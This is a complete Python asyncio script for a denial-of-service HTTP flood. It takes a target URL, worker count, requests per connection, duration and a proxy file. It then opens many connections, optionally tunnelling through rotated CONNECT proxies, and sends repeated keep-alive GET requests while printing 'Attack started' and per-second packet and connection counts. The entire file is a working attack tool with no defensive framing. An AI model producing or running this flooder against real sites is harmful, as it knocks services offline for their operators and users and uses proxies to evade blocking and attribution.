from asyncio import open_connection, create_task, Event, sleep, run
from yarl import URL
from sys import argv as args
from contextlib import suppress
import random

pps, cps = 0, 0

async def flooder(target: URL, payload: bytes, event: Event, rpc: int = 100, proxy: tuple = None):
    global pps, cps
    await event.wait()

    while event.is_set():
        with suppress(Exception):
            if proxy:
                proxy_host, proxy_port = proxy
                r, w = await open_connection(proxy_host, proxy_port)
                # Send a CONNECT request to the proxy
                connect_request = f"CONNECT {target.host}:{target.port or 80} HTTP/1.1\r\nHost: {target.host}:{target.port or 80}\r\n\r\n"
                w.write(connect_request.encode())
                await w.drain()
                # Read the response from the proxy
                response = await r.readuntil(b'\r\n\r\n')
                if b"200 Connection established" not in response:
                    print(f"Failed to connect through proxy: {proxy}")
                    continue
            else:
                r, w = await open_connection(target.host, target.port or 80, ssl=target.scheme == "https")
            
            cps += 1
            for _ in range(rpc):
                w.write(payload)
                await w.drain()
                pps += 1

async def main():
    global pps, cps
    
    try:
        assert len(args) == 6, "python3 %s <target> <workers> <rpc> <timer> <proxy_file>" % args[0]
        assert URL(args[1]) or None, "Invalid url"
        assert args[2].isdigit(), "Invalid workers integer"
        assert args[3].isdigit(), "Invalid connection pre seconds"
        assert args[4].isdigit(), "Invalid timer"
        
        target = URL(args[1])
        workers = int(args[2])
        rpc = int(args[3])
        timer = int(args[4])
        proxy_file = args[5]
        event = Event()

        payload = (
            f"GET {target.raw_path_qs} HTTP/1.1\r\n"
            f"Host: {target.raw_authority}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n").encode()

        event.clear()

        # Load proxies from the specified proxy file
        proxies = []
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    host, port = line.split(':')
                    proxies.append((host, int(port)))

        for _ in range(workers):
            proxy = random.choice(proxies) if proxies else None
            create_task(flooder(target, payload, event, rpc, proxy))
            await sleep(.0)
            
        event.set()
        print("Attack started to %s" % target.human_repr())

        while timer:
            pps, cps = 0, 0
            await sleep(1)
            timer -= 1
            print(f"PPS: {pps:,} | CPS: {cps:,} | Time Remaining: {timer:,}s")
        event.clear()
    except AssertionError as e:
        print(str(e) or repr(e))
        
run(main())